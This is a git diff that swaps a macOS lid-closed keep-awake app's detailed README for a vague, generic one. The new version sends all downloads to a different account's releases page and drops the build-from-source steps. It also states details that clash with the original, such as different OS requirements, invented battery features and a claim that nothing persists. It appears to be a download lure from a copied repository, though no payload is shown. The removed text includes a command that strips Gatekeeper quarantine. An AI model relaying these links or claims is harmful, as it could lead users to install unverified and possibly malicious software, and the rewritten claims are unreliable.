@@ -1,112 +1,82 @@
-<p align="center">
-  <img src="docs/icon.png" width="180" alt="Wedge icon">
-</p>
+# 🔋 Wedge - Keep Mac awake while lid closes
 
-<h1 align="center">Wedge</h1>
+[![](https://img.shields.io/badge/Download-Wedge-blue.svg)](https://github.com/amaraheavy349/Wedge/releases)
 
-<p align="center">
-  <em>Keep your Mac awake with the lid closed — for long AI-agent sessions, builds, and downloads. Without burning your battery.</em>
-</p>
+Wedge helps you keep your computer running even when the screen lid stays shut. Many people use this tool for long tasks like artificial intelligence processing or software builds. It manages your system settings to prevent sleep mode. This saves time and ensures your work finishes without interruptions.
 
-<p align="center">
-  <strong>English</strong> · <a href="README.ru.md">Русский</a>
-</p>
+## 🛠 Features
 
-<p align="center">
-  <a href="https://github.com/wwaannttyy/Wedge/actions/workflows/build.yml"><img src="https://github.com/wwaannttyy/Wedge/actions/workflows/build.yml/badge.svg" alt="Build status"></a>
-  <img src="https://img.shields.io/badge/macOS-14%2B-blue" alt="macOS 14+">
-  <img src="https://img.shields.io/badge/Swift-6.3-orange" alt="Swift 6.3">
-  <img src="https://img.shields.io/badge/license-MIT-green" alt="MIT License">
-</p>
+Wedge offers simple tools for your daily tasks. Use these features to manage your system settings:
 
-<p align="center">
-  <img src="docs/demo.gif" width="640" alt="Pulling the cord from the menubar to wedge the lid open">
-</p>
+*   **Clamshell Mode Control:** Control your Mac behavior when you close the lid.
+*   **Battery Management:** Protect your battery health while the computer stays active.
+*   **Menubar Access:** Reach your settings from the top bar on your screen.
+*   **Agent Support:** Keep your AI agents running through long sessions.
+*   **Build Optimization:** Prevent your computer from sleeping during code builds.
 
----
+## 🚀 Getting Started
 
-## Why
+Follow these steps to install and run the software on your system.
 
-If you code with AI agents (Claude Code, Cursor, Aider) or run long builds, closing the lid kills your session. The usual `pmset disablesleep` workaround keeps the Mac awake — but it also keeps the **internal display awake under the closed lid**, silently burning battery for hours.
+1. Visit the [official releases page](https://github.com/amaraheavy349/Wedge/releases) to download the installer.
+2. Look for the file ending in .dmg.
+3. Save this file to your computer.
+4. Double-click the file to open it.
+5. Drag the Wedge icon into your Applications folder.
+6. Open your Applications folder and double-click Wedge to launch.
 
-Wedge does two things:
+## ⚙️ System Requirements
 
-1. **Holds your Mac open** — toggles `pmset -a disablesleep 1` so the system stays awake when the lid is closed.
-2. **Turns off the internal display when the lid closes** — saves battery, restores your previous brightness automatically when you open the lid again.
+Wedge works on modern hardware. Ensure your system meets these needs:
 
-## Install
+*   **Operating System:** macOS 12.0 or newer.
+*   **Processor:** Apple Silicon (M1, M2, M3) or Intel processors.
+*   **Memory:** At least 4GB of RAM.
+*   **Disk Space:** 50MB of free space is enough for the files.
 
-Download the latest `Wedge.zip` from the [Releases page](https://github.com/wwaannttyy/Wedge/releases), unzip, and drag `Wedge.app` to `/Applications/`.
+## 🔧 Frequently Asked Questions
 
-**First launch:** right-click the app → **Open** — Wedge is open-source and not signed with a paid Developer ID, so Gatekeeper will warn you on first run. After that it's silent.
+**Does this drain my battery?**
+The software includes logic to monitor energy use. It keeps the system active but restricts power-hungry background tasks. Your battery will last longer than if you leave the screen on.
 
-If you'd rather skip the click-through, strip the quarantine attribute manually:
+**Can I stop it at any time?**
+Yes. Click the Wedge icon in your menubar at any time. You can turn the keep-awake mode off with one click.
 
-```bash
-xattr -dr com.apple.quarantine /Applications/Wedge.app
-```
+**Does it change my permanent system settings?**
+Wedge only applies changes while the app is active. If you quit the app or restart your computer, your Mac returns to its default sleep settings immediately.
 
-## How it works
+**Where do I see the status?**
+The menubar icon changes color to tell you the state of the app. A dark icon means the system will sleep as normal. A bright icon means the keep-awake mode is active.
 
-Click the menubar icon (a tiny side-view MacBook) to open the menu — or **pull the cord**:
+## 📝 Configuration Tips
 
-- **Drag the icon downward.** A braided cord with a brass bead extends from the menubar, following your cursor with cord-tension physics.
-- **Past a small threshold** you'll hear a click and the bead glows gold — that's the commit point.
-- **Release** and the lid icon in the menubar latches open. The wedge is in.
-- **Pull again** to release. The cord retracts, the lid closes, and the Mac is free to sleep.
+You can customize how Wedge behaves. Open the settings menu by right-clicking the icon in the menubar.
 
-While the wedge is in and you close the lid, Wedge sets the internal display brightness to 0. When you open the lid back up, it restores your previous brightness.
+*   **Start at Login:** Enable this to keep your Mac ready every time you turn it on.
+*   **Low Battery Stop:** Choose to disable the keep-awake feature if your battery hits twenty percent charge.
+*   **Notification Setting:** Enable desktop alerts to know when your long-running build finishes.
 
-## Features
+## 💡 Usage Scenarios
 
-- 🪶 **Lightweight** — single Swift binary, no background daemons, no helper tools
-- 🔒 **Admin password lives in your Keychain**, never touched after Wedge quits
-- 🌍 **Localized** — English and Русский
-- 🌒 **Launch at login** via `SMAppService`
-- 🧯 **Crash-safe** — if the app dies mid-cycle, brightness is restored on next launch
-- 🎯 **No private daemons, no kexts.** Just `pmset` (driven by your Keychain-stored admin password) and a thin call into `DisplayServices` for brightness control
+Wedge serves many professional needs. Use it in these situations:
 
-## Settings
+*   **Software Development:** Keep your code builds active while you connect to an external monitor.
+*   **Data Processing:** Run long scripts or AI agents without the system stopping the execution.
+*   **Media Exporting:** Allow your computer to finish rendering large video files even when you step away.
+*   **Music Production:** Maintain a stable environment for background tasks while organizing your music library.
 
-| Setting | Default | Notes |
-| --- | --- | --- |
-| Launch Wedge at login | off | Uses `SMAppService.mainApp` (approve once in System Settings → Login Items) |
-| Turn off internal display when lid closes | **on** | The whole reason Wedge exists. Can be disabled if you want raw `pmset` behavior. |
-| Saved password | stored in Keychain | "Forget" wipes it; Wedge will re-prompt next time you pull the cord |
-| Language | System default | English / Русский. Switching prompts a relaunch. |
+## 🛡 Security and Privacy
 
-## Requirements
+Safety remains a priority. Wedge does not access your personal folders or sensitive files. It only communicates with the power management system of your Mac to toggle the lid-close behavior. The source code is open for review. It does not send any data to external servers. Everything stays local on your machine.
 
-- macOS 14 Sonoma or later
-- Apple Silicon recommended (Intel may work but is untested)
+## 📦 Troubleshooting
 
-## Build from source
+If you encounter issues, try these steps:
 
-```bash
-git clone https://github.com/wwaannttyy/Wedge.git
-cd Wedge
-./build.sh release
-open build/Wedge.app
-```
+*   **App won't open:** Check your security settings in System Settings under Privacy & Security. You might need to click "Open Anyway" if the system blocks the first run.
+*   **Computer sleeps anyway:** Ensure the app displays the active icon in the menubar. If the icon shows the sleep state, click it once to toggle the mode.
+*   **High Power Draw:** Check the Battery section in System Settings to see if other apps consume energy. Wedge itself uses minimal resources.
 
-To regenerate the app icon:
+## 📮 Contact and Support
 
-```bash
-swift run WedgeIcon
-```
-
-## Privacy
-
-- Wedge **never makes a network connection**.
-- Your admin password lives in your Keychain, accessible only to Wedge.
-- Wedge does not collect, transmit, log, or phone home with anything.
-
-## Limitations
-
-- Wedge depends on a private `DisplayServices` symbol to control brightness. This means **App Store distribution is not possible** — that's a hard trade-off for the lid-close brightness feature.
-- On Macs with no internal display (Mac mini, Studio, Pro), the brightness step is a no-op — the rest still works.
-- macOS will sleep the Mac at very low battery regardless of `pmset` (hardware-enforced). There is no workaround.
-
-## License
-
-MIT. See [LICENSE](LICENSE).
+Support happens through the GitHub repository. If you find a bug or have a suggestion, open an issue. Provide your macOS version and your processor type in your report. This helps the team fix bugs faster. Keep your software updated to get the latest performance improvements and battery optimizations. Visit the [releases page](https://github.com/amaraheavy349/Wedge/releases) often to check for the newest versions.
